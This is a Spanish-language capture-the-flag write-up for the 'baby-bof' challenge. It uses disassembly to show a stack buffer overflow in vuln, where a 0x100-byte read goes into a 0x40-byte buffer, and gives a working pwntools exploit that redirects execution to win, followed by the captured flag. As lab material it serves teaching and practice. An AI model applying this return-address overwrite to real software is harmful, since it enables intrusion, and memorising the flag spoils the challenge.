# baby-bof

```
checksec challenge
[*] '/home/kalcast/Descargas/ctf/PWN/baby-bof/challenge'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

- No tiene `PIE` asi que las direcciones son fijas

- Hay una funcion "win" que lee el contenido de "flag.txt"
```
objdump --disassemble-all challenge | grep -A 12 win

0000000000401196 <win>:
  401196:       55                      push   %rbp
  401197:       48 89 e5                mov    %rsp,%rbp
  40119a:       48 81 ec 90 00 00 00    sub    $0x90,%rsp
  4011a1:       48 8d 05 5c 0e 00 00    lea    0xe5c(%rip),%rax        # 402004 <_IO_stdin_used+0x4>
  4011a8:       48 89 c6                mov    %rax,%rsi
  4011ab:       48 8d 05 54 0e 00 00    lea    0xe54(%rip),%rax        # 402006 <_IO_stdin_used+0x6>
  4011b2:       48 89 c7                mov    %rax,%rdi
  4011b5:       e8 d6 fe ff ff          call   401090 <fopen@plt>     ------------ opening the file ------------
  4011ba:       48 89 45 f8             mov    %rax,-0x8(%rbp)
  4011be:       48 83 7d f8 00          cmpq   $0x0,-0x8(%rbp)
  4011c3:       75 28                   jne    4011ed <win+0x57>       ------------ jmp to read-write-exit logic    
  4011c5:       48 8d 05 43 0e 00 00    lea    0xe43(%rip),%rax        # 40200f <_IO_stdin_used+0xf>   ------------ Error opening the file ------------
  4011cc:       48 89 c7                mov    %rax,%rdi
  4011cf:       e8 5c fe ff ff          call   401030 <puts@plt>
  4011d4:       48 8b 05 75 2e 00 00    mov    0x2e75(%rip),%rax        # 404050 <stdout@GLIBC_2.2.5>
  4011db:       48 89 c7                mov    %rax,%rdi
  4011de:       e8 8d fe ff ff          call   401070 <fflush@plt>
  4011e3:       bf 01 00 00 00          mov    $0x1,%edi
  4011e8:       e8 b3 fe ff ff          call   4010a0 <exit@plt>
  4011ed:       48 8b 55 f8             mov    -0x8(%rbp),%rdx       ------------ Flag exists, reading with `fgets` and printing it with `puts` ------------
  4011f1:       48 8d 85 70 ff ff ff    lea    -0x90(%rbp),%rax
  4011f8:       be 80 00 00 00          mov    $0x80,%esi
  4011fd:       48 89 c7                mov    %rax,%rdi
  401200:       e8 5b fe ff ff          call   401060 <fgets@plt>
  401205:       48 85 c0                test   %rax,%rax
  401208:       74 1e                   je     401228 <win+0x92>
  40120a:       48 8d 85 70 ff ff ff    lea    -0x90(%rbp),%rax
  401211:       48 89 c7                mov    %rax,%rdi
  401214:       e8 17 fe ff ff          call   401030 <puts@plt>
  401219:       48 8b 05 30 2e 00 00    mov    0x2e30(%rip),%rax        # 404050 <stdout@GLIBC_2.2.5>
  401220:       48 89 c7                mov    %rax,%rdi
  401223:       e8 48 fe ff ff          call   401070 <fflush@plt>
  401228:       48 8b 45 f8             mov    -0x8(%rbp),%rax
  40122c:       48 89 c7                mov    %rax,%rdi
  40122f:       e8 0c fe ff ff          call   401040 <fclose@plt>
  401234:       bf 00 00 00 00          mov    $0x0,%edi
  401239:       e8 62 fe ff ff          call   4010a0 <exit@plt>
```

- Hay un buffer overflow en vuln:
```
objdump --disassemble challenge --disassembler-options="intel" | grep -A 24 "<vuln>"
000000000040123e <vuln>:
  40123e:       55                      push   rbp
  40123f:       48 89 e5                mov    rbp,rsp
  401242:       48 83 ec 40             sub    rsp,0x40
  401246:       48 8d 05 d0 0d 00 00    lea    rax,[rip+0xdd0]        # 40201d <_IO_stdin_used+0x1d>
  40124d:       48 89 c7                mov    rdi,rax
  401250:       e8 db fd ff ff          call   401030 <puts@plt>
  401255:       48 8b 05 f4 2d 00 00    mov    rax,QWORD PTR [rip+0x2df4]        # 404050 <stdout@GLIBC_2.2.5>
  40125c:       48 89 c7                mov    rdi,rax
  40125f:       e8 0c fe ff ff          call   401070 <fflush@plt>
  401264:       48 8d 45 c0             lea    rax,[rbp-0x40]             ------------ a buffer 0f 0x40 bytes  ------------
  401268:       ba 00 01 00 00          mov    edx,0x100                  ------------ it reads 0x100 bytes instead of 0x40  ------------
  40126d:       48 89 c6                mov    rsi,rax
  401270:       bf 00 00 00 00          mov    edi,0x0                 
  401275:       e8 d6 fd ff ff          call   401050 <read@plt>          ** read(0,buf,100) **
  40127a:       90                      nop
  40127b:       c9                      leave
  40127c:       c3                      ret
```

--- 

El offset a la direccion de retorno de vuln es de 0x40(tamaño del buffer) + 0x8 (RBP almacenado) = 0x48 (72) bytes.

La direccion de `win` es 0x401196.

### Exploit:
```py
#!/usr/bin/env python3

from pwn import *

elf = ELF("./challenge")
#libc = ELF("./")
#ld = ELF("./")

context.binary = elf
context.terminal = ['tmux', 'splitw', '-hp', '70']
#context.log_level = "debug"
gs = '''
break main
'''

domain= "ctf.ac.upt.ro"
port = 9329

def start():
    if args.REMOTE:
        return remote(domain, port)
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gs)
    else:
        return process([elf.path])
r = start()

#========= exploit here ===================

r.send(b"A"*72+p64(0x401196))
r.interactive()
```

`ctf{3c1315f63d550570a690f693554647b7763c3acbc806ae846ce8d25b5f364d10}`





